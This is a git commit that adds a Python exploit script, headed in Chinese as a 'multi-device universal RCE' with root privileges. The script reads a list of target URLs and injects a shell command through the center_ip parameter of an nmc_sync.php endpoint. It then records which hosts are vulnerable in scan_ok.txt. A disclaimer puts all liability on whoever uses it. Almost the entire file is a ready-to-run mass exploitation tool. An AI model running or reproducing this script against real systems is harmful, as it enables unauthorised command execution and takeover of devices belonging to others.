15975e8f5eb9d05e6612e83b1706e107efffa23d
Pings <96440773+BugFor-Pings@users.noreply.github.com>
2024-01-11 17:22:59 +0800

    Add files via upload

---
+++ 多类设备通杀RCE.py
@@ -0,0 +1,40 @@
+##  name: 多设备通杀RCE
+##  author: Pings
+##  severity: critical
+##  description: 多设备通杀代码执行，系统权限均为root
+
+##任何因传播或利用本脚本造成的直接或间接后果及损失，均由使用者自行承担责任。作者对此概不负责。
+
+import requests
+import urllib3
+
+requests.urllib3.disable_warnings()
+
+
+def exp(url):
+    try:
+        res = requests.get(url + "/view/systemConfig/management/nmc_sync.php?center_ip=1;whoami > 1.txt;&template_path=1", verify=False, timeout=10)
+        shell_url = url + '/view/systemConfig/management/1.txt'
+        if 'OK!' in res.text:
+            print(f'[+]存在漏洞:{shell_url}')
+            try:
+                with open('scan_ok.txt', 'a') as f:
+                    f.write('复现地址：' + shell_url + '\n')
+            except Exception as e:
+                print(f'[!]漏洞不存在或发生异常: {e}')
+    except Exception as e:
+        print(f'[!]发生异常: {e}')
+
+
+def main():
+    with open('url.txt', 'r') as f:
+        resp = f.readlines()
+        for url in resp:
+            url = url.strip()
+            if 'http' not in url:
+                url = 'http://' + url
+            exp(url)
+
+
+if __name__ == '__main__':
+    main()
